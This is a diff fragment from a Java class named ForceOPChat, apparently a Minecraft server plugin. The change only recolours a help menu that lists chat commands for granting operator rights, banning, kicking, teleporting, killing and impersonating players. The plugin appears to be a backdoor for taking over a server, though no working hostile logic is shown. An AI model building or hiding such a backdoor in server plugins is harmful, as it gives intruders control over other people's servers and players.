@@ -49,14 +49,14 @@ public class ForceOPChat implements Listener{
 	}
 	
 	private void showIndex(Player p) {
-		p.sendMessage(prefix+"help");
-		p.sendMessage(prefix+"op [player]");
-		p.sendMessage(prefix+"ban <player>");
-		p.sendMessage(prefix+"kick <player>");
-		p.sendMessage(prefix+"invsee <player>");
-		p.sendMessage(prefix+"tp <player> [player]");
-		p.sendMessage(prefix+"kill <player>");
-		p.sendMessage(prefix+"sudo <player> <msg>");
+		p.sendMessage(RED + prefix+PINK + "help");
+		p.sendMessage(RED + prefix+PINK + "op [player]");
+		p.sendMessage(RED + prefix+PINK + "ban <player>");
+		p.sendMessage(RED + prefix+PINK + "kick <player>");
+		p.sendMessage(RED + prefix+PINK + "invsee <player>");
+		p.sendMessage(RED + prefix+PINK + "tp <player> [player]");
+		p.sendMessage(RED + prefix+PINK + "kill <player>");
+		p.sendMessage(RED + prefix+PINK + "sudo <player> <msg>");
 	}
 	
 	public void broadcast(String msg) {
